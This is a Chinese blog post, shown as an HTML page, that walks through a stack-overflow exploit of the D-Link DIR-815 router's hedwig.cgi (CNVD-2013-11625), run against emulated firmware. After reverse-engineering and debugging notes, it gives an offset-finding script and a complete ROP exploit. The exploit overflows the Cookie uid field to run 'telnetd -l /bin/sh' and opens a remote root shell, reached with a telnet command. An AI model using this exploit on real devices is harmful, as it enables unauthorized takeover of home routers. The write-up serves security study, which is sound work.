@@ -1,0 +1,737 @@
+<!DOCTYPE html><html lang="zh-Hans"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>dir-815 | 沉于思，录以隙</title><meta name="description" content="CNVD-2013-11625 官方的漏洞报告中只提及了DIR-645型号的hedwig.cgi中会存在缓冲区溢出的漏洞，其实D-Link的DIR-815/300/600/645等型号都存在这个漏洞，DIR-815 cgibi中hedwig_cgi函数中处理HTTP 头中 Coo"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700&family=Zhi+Mang+Xing&family=Noto+Serif+SC:wght@400;500;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"><script>
+      (() => {
+        try {
+          const saved = localStorage.getItem("theme");
+          const theme = saved === "dark" || saved === "light"
+            ? saved
+            : (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+          document.documentElement.setAttribute("data-theme", theme);
+        } catch {
+          document.documentElement.setAttribute("data-theme", "light");
+        }
+      })();
+    </script><link rel="stylesheet" href="/_astro/_folder_.vzbGpqN6.css"></head> <body class="is-post-page"> <header class="topbar topbar-post"> <a class="brand" href="/">沉于思，录以隙</a> <nav class="nav-links"> <a href="/" class>首页</a> <a href="/folders" class>目录</a> <a href="/tags" class>标签</a> <a href="/#archive-search">搜索</a> <button id="theme-toggle" type="button" aria-label="切换主题"> <span class="theme-icon theme-sun">☀</span> <span class="theme-icon theme-moon">☾</span> </button> </nav> </header> <main id="main-content" class="page-shell page-main is-post-main">  <section class="post-cover-hero" style="background-image: url('/hero-bg.jpg')"> <div class="post-cover-hero__overlay"></div> <div class="post-cover-hero__inner"> <p class="post-cover-hero__eyebrow">二进制</p> <h1 class="post-cover-hero__title">dir-815</h1> </div> </section> <div class="article-shell article-shell--toc-collapsed" id="article-shell"> <a class="back-link" href="/">&larr; 返回首页花园</a> <div class="article-layout"> <article class="article-panel"> <header class="article-header"> <div class="article-directory"> <a href="/folders" class="directory-link">目录</a>  <span class="directory-sep">/</span> <a href="/folders/二进制/" class="directory-link">二进制</a>   <span class="directory-sep">/</span> <span class="directory-text">iot</span>  <span class="directory-sep">/</span> <span class="directory-text">路由器</span>  </div> <div class="article-meta-row"> <span>2025/12/12</span> <span>二进制</span>  </div> <div class="tag-row article-header__tags">  </div> <p class="source-note">来源路径：二进制/iot/路由器/dir-815.md</p> </header> <div class="article-main"> <div class="article-content"><p>CNVD-2013-11625</p>
+<p>官方的漏洞报告中只提及了DIR-645型号的hedwig.cgi中会存在缓冲区溢出的漏洞，其实D-Link的DIR-815/300/600/645等型号都存在这个漏洞，DIR-815 cgibi中hedwig_cgi函数中处理HTTP 头中 Cookie 字段中 uid 的值时存在栈溢出漏洞</p>
+<h1>环境</h1><p>虚拟机：Ubuntu20.04</p>
+<p>固件：DIR-815_FIRMWARE_1.01</p>
+<h1>提取固件</h1><pre><code>binwalk -Me &quot;DIR-815 FW 1.01b14_1.01b14.bin&quot;
+</code></pre>
+<p>寻找官方漏洞报告中的<code>hedwig.cgi</code>漏洞文件,其架构是mips</p>
+<pre><code class="language-bash">myx@ubuntu:~/Desktop/iot/DIR-815$ sudo find ./ -name hedwig.cgi
+./_DIR-815A1_FW101SSB03.bin.extracted/squashfs-root/htdocs/web/hedwig.cgi
+</code></pre>
+<p>现文件的软链接指向了/htdocs/cgibin（软连接类似快捷方式，名字不同但指向同一地址）</p>
+<p>所以我们就需要逆向分析cgibin这个二进制文件</p>
+<pre><code class="language-bash">yx@ubuntu:~/Desktop/iot/DIR-815/_DIR-815A1_FW101SSB03.bin.extracted/squashfs-root/htdocs/web$ ls -l
+total 300
+lrwxrwxrwx 1 myx myx   14 Apr 15 23:50 captcha.cgi -&gt; /htdocs/cgibin
+-rw-rw-r-- 1 myx myx  544 Sep 14  2010 check_stats.php
+lrwxrwxrwx 1 myx myx   14 Apr 15 23:50 conntrack.cgi -&gt; /htdocs/cgibin
+-rw-rw-r-- 1 myx myx  327 Sep 14  2010 diagnostic.php
+lrwxrwxrwx 1 myx myx   14 Apr 15 23:50 dlcfg.cgi -&gt; /htdocs/cgibin
+lrwxrwxrwx 1 myx myx   15 Apr 15 23:50 docs -&gt; /var/htdocs/web
+-rw-rw-r-- 1 myx myx 1150 Sep 14  2010 favicon.ico
+lrwxrwxrwx 1 myx myx   14 Apr 15 23:50 fwup.cgi -&gt; /htdocs/cgibin
+lrwxrwxrwx 1 myx myx   14 Apr 15 23:50 hedwig.cgi -&gt; /htdocs/cgibin
+</code></pre>
+<h1>分析cgibin二进制文件</h1><h2 id="section-1">main函数</h2><p><code>main</code> 函数的最开始在匹配程序名以来调用不同的函数来实现具体功能。</p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  const char *v3; // $s0
+  char *v6; // $v0
+  int (*v8)(); // $t9
+  int v9; // $a0
+
+  v3 = *argv;
+  v6 = strrchr(*argv, 47); 
+  if ( v6 )
+    v3 = v6 + 1;
+  if ( !strcmp(v3, &quot;phpcgi&quot;) )
+  {
+    v8 = phpcgi_main;
+    v9 = argc;
+    return (v8)(v9, argv, envp);
+  }
+  if ( !strcmp(v3, &quot;dlcfg.cgi&quot;) )
+  {
+    v8 = dlcfg_main;
+    v9 = argc;
+    return (v8)(v9, argv, envp);
+  }
+  if ( !strcmp(v3, &quot;seama.cgi&quot;) )
+  {
+    v8 = seamacgi_main;
+    v9 = argc;
+    return (v8)(v9, argv, envp);
+  }
+  if ( !strcmp(v3, &quot;fwup.cgi&quot;) )
+  {
+    v8 = fwup_main;
+    v9 = argc;
+    return (v8)(v9, argv, envp);
+  }
+  if ( !strcmp(v3, &quot;fwupdater&quot;) )
+  {
+    v8 = fwupdater_main;
+    v9 = argc;
+    return (v8)(v9, argv, envp);
+  }
+  if ( !strcmp(v3, &quot;session.cgi&quot;) )
+  {
+    v8 = &amp;sessioncgi_main;
+    v9 = argc;
+    return (v8)(v9, argv, envp);
+  }
+  if ( !strcmp(v3, &quot;captcha.cgi&quot;) )
+  {
+    v8 = &amp;captchacgi_main;
+    v9 = argc;
+    return (v8)(v9, argv, envp);
+  }
+  if ( !strcmp(v3, &quot;hedwig.cgi&quot;) )  //目标函数在这里
+  {
+    v8 = hedwigcgi_main;
+    v9 = argc;
+    return (v8)(v9, argv, envp);
+  }
+  if ( !strcmp(v3, &quot;pigwidgeon.cgi&quot;) )
+  {
+    v8 = &amp;pigwidgeoncgi_main;
+    v9 = argc;
+    return (v8)(v9, argv, envp);
+  }
+  if ( !strcmp(v3, &quot;service.cgi&quot;) )
+  {
+    v8 = &amp;servicecgi_main;
+    v9 = argc;
+    return (v8)(v9, argv, envp);
+  }
+  if ( !strcmp(v3, &quot;ssdpcgi&quot;) )
+  {
+    v8 = ssdpcgi_main;
+    v9 = argc;
+    return (v8)(v9, argv, envp);
+  }
+  if ( !strcmp(v3, &quot;soap.cgi&quot;) )
+  {
+    v8 = soapcgi_main;
+    v9 = argc;
+    return (v8)(v9, argv, envp);
+  }
+  if ( !strcmp(v3, &quot;gena.cgi&quot;) )
+  {
+    v8 = genacgi_main;
+    v9 = argc;
+    return (v8)(v9, argv, envp);
+  }
+  if ( !strcmp(v3, &quot;conntrack.cgi&quot;) )
+  {
+    v8 = &amp;conntrackcgi_main;
+    v9 = argc;
+    return (v8)(v9, argv, envp);
+  }
+  if ( !strcmp(v3, &quot;hnap&quot;) )
+  {
+    v8 = &amp;hnap_main;
+    v9 = argc;
+    return (v8)(v9, argv, envp);
+  }
+  printf(&quot;CGI.BIN, unknown command %s\n&quot;, v3);
+  return 1;
+}
+</code></pre>
+<p>以下面这段代码为例，首先根据 <code>*argv</code> 获取程序的名字，通过 <code>strrchr</code> 函数来匹配程序名中最后一个 <code>/</code> 出现的位置， <code>v6+1</code> 取的是 <code>/</code> 的下一个字符的地址，然后来匹配是否为 <code>phpcgi</code> 这个字符串， 如果是的话则跳转到 <code>phpcgi_main</code> 函数，整个 <code>main</code> 函数都是在做这个事情</p>
+<pre><code class="language-c">v3 = *argv;
+v6 = strrchr(*argv, &#39;/&#39;);
+if ( v6 )
+  v3 = v6 + 1;
+if ( !strcmp(v3, &quot;phpcgi&quot;) )
+{
+  v8 = (void (__noreturn *)())phpcgi_main;
+  v9 = argc;
+  return ((int (__fastcall *)(int, const char **, const char **))v8)(v9, argv, envp);
+}
+</code></pre>
+<h2 id="section-2">hedwigcgi_main</h2><pre><code class="language-c">int sprintf(char *str, const char *format, ...);
+str：目标字符串（结果会写进这个数组里）
+format：格式化字符串（和 printf 一样）
+...：要插入格式字符串的变量
+</code></pre>
+<p>危险函数为sprintf，通过分析，只有reqest_mode为post才能触发</p>
+<pre><code class="language-c">  request = getenv(&quot;REQUEST_METHOD&quot;);
+  if ( !request )
+  {
+    v1 = &quot;no REQUEST&quot;;
+LABEL_7:
+    v3 = 0;
+    v4 = 0;
+LABEL_34:
+    v9 = -1;c
+    goto LABEL_25;
+  }
+  if ( strcasecmp(request, &quot;POST&quot;) )            // 相等返回0
+  {
+    v1 = &quot;unsupported HTTP request&quot;;
+    goto LABEL_7;
+  }
+</code></pre>
+<h3 id="section-3"><em>sess_get_uid</em>函数</h3><pre><code class="language-c">sess_get_uid(v4);                 // 提取cookie中&#39;uid=&#39;后面的字符串存在v4 分析得出COOKIE的数据组织形式是uid=payload
+//该函数具体功能是通过逐个扫描 COOKIE 的字符，来寻找 = ，如果找到了 = 则设置 state 为 2 ，之后再扫描字符的时候因为 state 为 2 的缘故，都会进入另一个分支，去将扫描 COOKIE 的字符存储到 v4 结构体的 data 成员中。如果没有找到 = 那么 state 一直为 1 ，则始终将 COOKIE 的字符存储到 v2 结构体的 data 成员中（如下图）
+//当扫描完 COOKIE 的所有字符后，去判断 v2 结构体的 data 成员是否为字符串 uid ，如果是的话，就将 v4 结构体之前存储的字符串写到结构体 a1 的 data 域中。（ a1 也就是 sess_get_uid 函数传入的结构体指针）
+</code></pre>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/7708ed4764cf8a22c3a3f2e59e1bef63_MD5.png" alt=""></p>
+<p>获取cookie值</p>
+<pre><code class="language-c">int __fastcall sess_get_uid(int a1)
+{
+  int v2; // $s2
+  char *v3; // $v0c
+  int v4; // $s3
+  char *v5; // $s4c
+  int v6; // $s1
+  int v7; // $s0
+  char *v8; // $v0
+  int result; // $v0
+
+  v2 = sobj_new();
+  v4 = sobj_new();
+  v3 = getenv(&quot;HTTP_COOKIE&quot;);//获取cookie
+</code></pre>
+<p>这里对cookie进行分割存储，等号前的内容存入ptr，等号后的内容存入v4</p>
+<pre><code class="language-c">      if ( cookie == &#39;;&#39; )  //37行
+      {
+        v6 = 0;
+      }
+      else
+      {
+        v6 = 2;
+        if ( cookie != &#39;=&#39; )
+        {
+          sobj_add_char(v2, cookie);
+          v6 = 1;
+        }
+      }
+      goto LABEL_18;
+    }
+    if ( v6 == 2 )
+    {
+      if ( cookie == &#39;;&#39; )
+      {
+        v6 = 3;
+        goto LABEL_18;
+      }
+      sobj_add_char(v4, *cookie_ptr++);
+    }
+</code></pre>
+<p>判断v2里的内容是不是uid，判断通过则将v4的内容拼接到a1后面</p>
+<pre><code class="language-c">    else
+    {
+      v6 = 0;
+      if ( !sobj_strcmp(v2, &quot;uid&quot;) )
+        goto LABEL_21;
+LABEL_18:
+      ++cookie_ptr;
+    }
+  }c
+  if ( !sobj_strcmp(v2, &quot;uid&quot;) )
+  {
+LABEL_21:
+    v8 = sobj_get_string(v4);
+    goto LABEL_22;
+  }
+LABEL_27:
+  v8 = getenv(&quot;REMOTE_ADDR&quot;);
+LABEL_22:
+  result = sobj_add_string(a1, v8);
+  if ( v2 )
+    result = (sobj_del)(v2);
+  if ( v4 )
+    result = (sobj_del)(v4);
+  return result;
+}
+</code></pre>
+<h3 id="section-4">sprintf</h3><p>我们继续往下走，发现有2个sprintf函数，两次sprintf都可以造成栈溢出漏洞，这里我们要利用的是第二次sprintf</p>
+<p>两次sprintf前后string和v20都是sobj_get_string(v4);,v4在此期间并未改变过,跟据分析我们知道v4为cookie中”uid=“后的内容，我们是可以自己控制其内容的</p>
+<pre><code class="language-c">1
+  sess_get_uid(v4);                             // 提取cookie中&#39;uid=&#39;后面的字符串存在v4 
+  cookie = sobj_get_string(v4);
+  sprintf(str, &quot;%s/%s/postxml&quot;, &quot;/runtime/session&quot;, cookie);// 第一个溢出点
+
+2
+  v20 = sobj_get_string(v4);
+  sprintf(str, &quot;/htdocs/webinc/fatlady.php\nprefix=%s/%s&quot;, &quot;/runtime/session&quot;, v20);
+</code></pre>
+<p>这里str的栈空间为1024，而cookie的长度没有限制，我们就可以通过控制v4达到栈溢出的效果</p>
+<pre><code class="language-c">  char str[1024]; // [sp+C0h] [-400h] BYREF
+</code></pre>
+<h1>漏洞利用</h1><h2 id="section-5">Firemae仿真路由器</h2><pre><code class="language-bash">测试能否仿真成功   sudo ./run.sh -c +固件品牌   +固件文件名
+进入仿真调试模式   sudo ./run.sh -d +固件品牌   +固件文件名
+
+myx@ubuntu:/opt/tools/FirmAE$ sudo ./run.sh -d Dlink /home/myx/Desktop/iot/DIR-815/DIR-815_FW_1.01b14.bin
+</code></pre>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20250423211844864.png" alt="image-20250423211844864"></p>
+<pre><code>先2连接shell，
+echo &quot;0&quot; &gt;&gt; /proc/sys/kernel/randomize_va_space  关地址随机化然后退出shell，
+再浏览器访问192.168.0.1，最后4启动gdbserver
+</code></pre>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20250423212955483.png" alt="image-20250423212955483"></p>
+<h2 id="section-6">gdb动态调试</h2><pre><code class="language-bash">gdb-multiarch
+
+#然后gdb内
+set architecture mips
+set follow-fork-mode child  #如果程序调用了 fork() 或 vfork()，GDB 会跟踪子进程，而不是父进程。
+set detach-on-fork off #默认情况下，如果程序 fork() 了，GDB 只会调试你选择的那一个进程，自动让另一个进程“脱离调试”。这条命令的作用是:不要自动 detach 掉另一个进程，两个进程都保持被 GDB 附着（即便只调试其中一个，也能随时切换）。
+target remote 192.168.0.1:1337
+
+b sprintf 
+#直接c到加载新库来到cgibin，再c 2次就开始单步调试
+</code></pre>
+<p>接下来我们在开启一个终端去发送poc，gdb就可以进行下一步调试了</p>
+<h2 id="section-7">确定返回地址偏移</h2><p>漏洞为栈溢出，那么我们第一步就是去测试他的偏移值，这里我们利用pwntools里的cyclic</p>
+<p>上面计算的偏移中包含字符串 “/htdocs/webinc/fatlady.php\nprefix=/runtime/session/”，因此要计算真实的偏移，应该去掉字符串 的长度。</p>
+<p>find_offset.py</p>
+<pre><code class="language-python">import requests
+from pwn import *
+
+# 目标地址
+url = &quot;http://192.168.0.1/hedwig.cgi&quot;
+
+# 构造 payload
+payload = cyclic(0x500).decode()
+
+# 请求头
+headers = {
+    &#39;Content-Length&#39;: &#39;21&#39;,  # 注意：requests 会自动计算实际长度，但你也可以保留它
+    &#39;Accept-Encoding&#39;: &#39;deflate&#39;,
+    &#39;Connection&#39;: &#39;close&#39;,
+    &#39;User-Agent&#39;: &#39;MozillIay4.0 (compatible MSIE 8.07 Winaows NT 6.17 WOW647 Triaent/4.07 SLCC27 -NET CDR 2.0.50727) -NET CLR 3.5.307297 .NET CILR 3.90.307297 Meaia CenteLr PC 6.07 .NET4.0C7 -NET4.0E)&#39;,
+    &#39;Host&#39;: &#39;192.168.0.1&#39;,
+    &#39;Cookie&#39;: f&#39;uid={payload}&#39;,
+    &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;
+}
+
+# 请求体
+data = &quot;password=123&amp;uid=3Rd4&quot;
+
+# 发送 POST 请求
+response = requests.post(url, headers=headers, data=data)
+
+# 打印响应状态码和内容
+print(response.status_code, response.text)
+</code></pre>
+<p>两次finish</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20250429170955128.png" alt="image-20250429170955128"></p>
+<p>确定偏移为1003+4=1007，即ra位置</p>
+<pre><code class="language-bash">myx@ubuntu:~/Desktop/iot/DIR-815$ python3
+Python 3.8.10 (default, Mar 18 2025, 20:04:55) 
+[GCC 9.4.0] on linux
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; from pwn import *
+&gt;&gt;&gt; cyclic(0x500)
+b&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaam&#39;
+
+&gt;&gt;&gt; cyclic_find(&#39;kbaa&#39;) #返回地址ra的上1位
+1003
+&gt;&gt;&gt; cyclic_find(&#39;jsaa&#39;) #s0
+971
+&gt;&gt;&gt; cyclic_find(&#39;jtaa&#39;) #s1
+975
+</code></pre>
+<h2 id="section-8">构造rop链</h2><p>路由器里面是开启了telntd服务的，我们只需要执行system(telentd)就可以getshell，函数调用规则时说过，前四个参数分别在a0---a3里，那么第一个参数就是a0了</p>
+<p><strong>Telnet</strong>是一种<a href="https://zh.wikipedia.org/wiki/%E5%BA%94%E7%94%A8%E5%B1%82">应用层</a>协议，使用于<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E9%9A%9B%E7%B6%B2%E8%B7%AF">互联网</a>及<a href="https://zh.wikipedia.org/wiki/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a>中，使用<a href="https://zh.wikipedia.org/wiki/%E8%99%9B%E6%93%AC%E7%B5%82%E7%AB%AF%E6%A9%9F">虚拟终端</a>的形式，提供双向、以文字字符串为主的<a href="https://zh.wikipedia.org/wiki/%E5%91%BD%E4%BB%A4%E5%88%97%E4%BB%8B%E9%9D%A2">命令行接口</a>交互功能。属于<a href="https://zh.wikipedia.org/wiki/TCP/IP">TCP/IP</a>协议族的其中之一，是<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E9%9A%9B%E7%B6%B2%E8%B7%AF">互联网</a>远程登录服务的标准协议和主要方式，常用于<a href="https://zh.wikipedia.org/wiki/%E4%BC%BA%E6%9C%8D%E5%99%A8">服务器</a>的远程控制，可供用户在本地主机执行远程主机上的工作。</p>
+<h3 id="section-9">mips_rop插件找gadget</h3><pre><code class="language-python">pwndbg&gt; vmmap
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+     Start        End Perm     Size Offset File
+  0x400000   0x41c000 r-xp    1c000      0 /htdocs/cgibin
+  0x42c000   0x42d000 rw-p     1000  1c000 /htdocs/cgibin
+  0x42d000   0x430000 rwxp     3000      0 [heap]
+0x778aa000 0x77908000 r-xp    5e000      0 /lib/libuClibc-0.9.30.1.so
+0x77908000 0x77917000 ---p     f000      0 [anon_77908]
+0x77917000 0x77918000 r--p     1000  5d000 /lib/libuClibc-0.9.30.1.so
+0x77918000 0x77919000 rw-p     1000  5e000 /lib/libuClibc-0.9.30.1.so
+0x77919000 0x7791e000 rw-p     5000      0 [anon_77919]
+0x7791e000 0x77947000 r-xp    29000      0 /lib/libgcc_s.so.1
+0x77947000 0x77957000 ---p    10000      0 [anon_77947]
+0x77957000 0x77958000 rw-p     1000  29000 /lib/libgcc_s.so.1
+0x77958000 0x7795d000 r-xp     5000      0 /lib/ld-uClibc-0.9.30.1.so
+0x7796a000 0x7796b000 rw-p     1000      0 [anon_7796a]
+0x7796b000 0x7796c000 r-xp     1000      0 [vdso]
+0x7796c000 0x7796d000 r--p     1000   4000 /lib/ld-uClibc-0.9.30.1.so
+0x7796d000 0x7796e000 rw-p     1000   5000 /lib/ld-uClibc-0.9.30.1.so
+0x7fba3000 0x7fbc4000 rwxp    21000      0 [stack]
+
+#libc基地址为0x778aa000，动态链接库是/lib/libuClibc-0.9.30.1.so。我们去链接库找gadget
+#但在相应路径没有此库，
+rwxrwxrwx  1 myx myx     21 Apr 24 00:10 libc.so.0 -&gt; libuClibc-0.9.30.1.so
+#发现是有个链接，所以实际库是libc.so.0，因为符号链接的原因不能直接从虚拟机复制到主机，共享文件夹用如下命令
+sudo cp -aL squashfs-root /mnt/hgfs/share/
+</code></pre>
+<p>ida界面点击：search&gt;mips rop gadgets</p>
+<p>之后在下面python输入框输入</p>
+<pre><code class="language-python">mipsrop.find(&quot;&quot;)  #这样就显示所有gadgets，如果具体查找在输入具体的吧
+mipsrop.find(&quot;jr&quot;)
+</code></pre>
+<p>根据《揭秘家用路由器0day漏洞挖掘技术》一书的方法：先将 <code>system</code> 函数的地址 -1 传入某个寄存器中，之后找到对这个寄存器进行加 +1 的操作的 gadget 进行调用即可将<code>system</code>地址恢复，因此我们查找<code>addiu $s0,1</code>指令，选用gadgets：0x000158C8</p>
+<pre><code>流水线机制
+由于现代处理器采用流水线执行指令的方式，在执行jalr指令时，下一条指令可能已经被预取和解码，并开始执行。因此，即使jalr指令改变了程序计数器的值，下一条指令也可能在当前指令被执行的同时开始执行。
+也就是说，执行jalr的同时，下一个指令也会执行。
+</code></pre>
+<pre><code>addiu rd, rs, immediate:  将寄存器 `rs` 中的值与一个立即数（`immediate`）相加，并将结果存入目标寄存器 `rd` 中。
+</code></pre>
+<pre><code class="language-python">Python&gt;mipsrop.find(&quot;addiu .*,1&quot;)
+----------------------------------------------------------------------------------------------------------------
+|  Address     |  Action                                              |  Control Jump                          |
+----------------------------------------------------------------------------------------------------------------
+|  0x00012E60  |  addiu $s2,1                                         |  jalr  $s6                             |
+|  0x000158C8  |  addiu $s0,1                                         |  jalr  $s5                             |
+|  0x000158D0  |  addiu $s0,1                                         |  jalr  $s5                             |
+|  0x00020368  |  addiu $a0,1                                         |  jalr  $s2                             |
+|  0x0002374C  |  addiu $s0,1                                         |  jalr  $fp                             |
+|  0x0002D194  |  addiu $s0,1                                         |  jalr  $s5                             |
+|  0x00031320  |  addiu $v1,1                                         |  jalr  $s3                             |
+----------------------------------------------------------------------------------------------------------------
+Found 27 matching gadgets
+#最后选用 0x000158C8
+.text:000158C8                 move    $t9, $s5
+.text:000158CC                 jalr    $t9 #会在跳转到$s5的同时，将s0+1，流水线机制
+.text:000158D0                 addiu   $s0, 1 #s0变为system
+.text:000158D4                 sb      $s7, 0($v0)
+</code></pre>
+<pre><code>jalr 指令的主要功能是实现子程序调用，其具体作用如下：
+
+把下一条指令的地址（也就是返回地址）保存到指定寄存器里。
+依据另一个寄存器的值来计算跳转目标地址，进而实现程序执行流程的跳转。
+</code></pre>
+<p>上面的gadget可以将s0赋值为<code>system</code>函数地址。现在我们还需要找到给<code>system</code>函数传参的gadget。mips架构前4参数在寄存器a0到a3，如果要搜将栈地址放入某个寄存器的 <code>gadget</code> ，可以用 <code>mipsrop.stackfinder()</code></p>
+<pre><code class="language-python">Python&gt;mipsrop.stackfinder()
+----------------------------------------------------------------------------------------------------------------
+|  Address     |  Action                                              |  Control Jump                          |
+----------------------------------------------------------------------------------------------------------------
+|  0x0000B814  |  addiu $a1,$sp,0x15C+var_144                         |  jalr  $s1                             |
+|  0x0000B830  |  addiu $a1,$sp,0x15C+var_A4                          |  jalr  $s1                             |
+|  0x0000DEF0  |  addiu $s2,$sp,0xA0+var_90                           |  jalr  $s4                             |
+|  0x00013F74  |  addiu $s1,$sp,0x28+var_10                           |  jalr  $s4                             |
+|  0x00014F28  |  addiu $s1,$sp,0x28+var_10                           |  jalr  $s4                             |
+|  0x000159CC  |  addiu $s5,$sp,0x14C+var_13C                         |  jalr  $s0                             |
+                       |
+#最后选用 0x000159CC,因为其既可以跳转至system函数，又可以通过s5给system函数传参：
+.text:000159CC                 addiu   $s5, $sp, 0x14C+var_13C #将&quot;telnetd&quot;传入s5
+.text:000159D0                 move    $a1, $s3
+.text:000159D4                 move    $a2, $s1
+.text:000159D8                 move    $t9, $s0      #从此开始关键，system给t9
+.text:000159DC                 jalr    $t9 ; mempcpy #流水线机制
+.text:000159E0                 move    $a0, $s5 #把&quot;telnetd&quot;给a0
+</code></pre>
+<h3 id="section-10">exp</h3><p>首先在s0传入system-1的地址，s5传入了0x000159cc的gadget。溢出之后，首先返回到s5的地址(即执行gad_to_s5)，同时，s0++，变为system的地址。此时执行第二个gadget,将&quot;telnetd&quot;传入s5,并且跳转到$s0也就是system,同时s5被赋值到a0也就是第一个参数，成功执行<code>system(&quot;telnetd -l /bin/sh -p 55557&quot;)。</code>设置端口是担心原本的被占用了。</p>
+<pre><code class="language-python">import http.client
+from pwn import *
+set(&quot;./cgibin&quot;)
+
+# 创建HTTP连接
+conn = http.client.HTTPConnection(&quot;192.168.0.1&quot;)
+
+## XOR $t0, $t0, $t0,相当于 nop，因为nop是\x00不能发送，会被sprintf截断
+nop = &quot;\x26\x40\x08\x01&quot;
+
+#libc基地址
+libc = 0x77f34000
+#gadget
+gadget = 0x159cc+libc
+gadget2 = libc+0x158c8 # addiu $s0,1 | jalr $s5  
+print(p32(gadget).hex())
+print(p32(gadget2).hex())
+sys = libc + 0x531ff
+print(p32(sys).hex())
+sys_ = &#39;\xffq\xf8w&#39; #sys-1
+gad_sp = &quot;\xcc\x99\xf4w&quot; #0x159cc
+gad_to_s5 = &quot;\xc8\x98\xf4w&quot;#0x158c8
+
+payload = cyclic(973).decode() + sys_ + &quot;cccc&quot;  + gad_sp*7 + gad_to_s5  + &quot;dddd&quot;*4 + &quot;telnetd -l /bin/sh -p 55557 &amp; ls &amp; &quot;
+# 设置请求头
+headers = {
+&#39;Content-Length&#39;: &#39;21&#39;,
+&#39;accept-Encoding&#39;: &#39;deflate&#39;,
+&#39;Connection&#39;: &#39;close&#39;,
+&#39;User-Agent&#39;: &#39;MozillIay4.0 (compatible MSIE 8.07 Winaows NT 6.17 WOW647 Triaent/4.07 SLCC27 -NET CDR 2.0.50727) -NET CLR 3.5.307297 .NET CILR 3.90.307297 Meaia CenteLr PC 6.07 .NET4.0C7 -NET4.0E)&#39;,
+&#39;Host&#39;: &#39;192.168.0.1&#39;,
+&#39;Cookie&#39;: &#39;uid=&#39;+payload,
+&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;
+}
+
+# 发送POST请求
+conn.request(&quot;POST&quot;, &quot;/hedwig.cgi&quot;, body=&quot;password=123&amp;uid=3Rd4&quot;, headers=headers)
+# 获取响应
+response = conn.getresponse()
+# 打印响应状态码和响应内容
+print(response.status, response.read().decode())
+# 关闭连接
+conn.close()
+</code></pre>
+<p>执行脚本后开个新shell,getshell</p>
+<pre><code>telnet 192.168.0.1 55557 
+</code></pre>
+<h1>参考</h1><p><a href="https://www.freebuf.com/vuls/395954.html">https://www.freebuf.com/vuls/395954.html</a></p>
+<p><a href="https://xz.aliyun.com/news/17315">https://xz.aliyun.com/news/17315</a></p>
+</div> <nav class="article-nav" style="display: flex; justify-content: space-between; margin-top: 64px; padding-top: 32px; border-top: 1px solid var(--line);"> <div class="nav-prev" style="flex: 1;"> <a href="/posts/二进制/iot/路由器/dir823g/" style="text-decoration: none;"> <p class="muted" style="margin: 0; font-size: 0.9rem; color: var(--muted);">&larr; 上一篇</p> <h4 style="margin: 8px 0 0; color: var(--ink);">dir823g</h4> </a> </div> <div class="nav-next" style="flex: 1; text-align: right;"> <a href="/posts/车联网/整车检测/" style="text-decoration: none;"> <p class="muted" style="margin: 0; font-size: 0.9rem; color: var(--muted);">下一篇 &rarr;</p> <h4 style="margin: 8px 0 0; color: var(--ink);">整车检测</h4> </a> </div> </nav> </div> </article>  <aside class="article-sidebar" id="article-sidebar"> <nav class="article-outline" aria-label="文章目录"> <div class="article-outline__head"> <strong>目录</strong> </div> <div class="article-outline__body"> <ol class="article-outline__list article-outline__list--groups"> <li class="article-outline__group" data-group-id="section-1"> <button class="article-outline__group-link" type="button" data-group-target="section-1"> <span>main函数</span>  </button>  </li><li class="article-outline__group" data-group-id="section-2"> <button class="article-outline__group-link" type="button" data-group-target="section-2"> <span>hedwigcgimain</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> 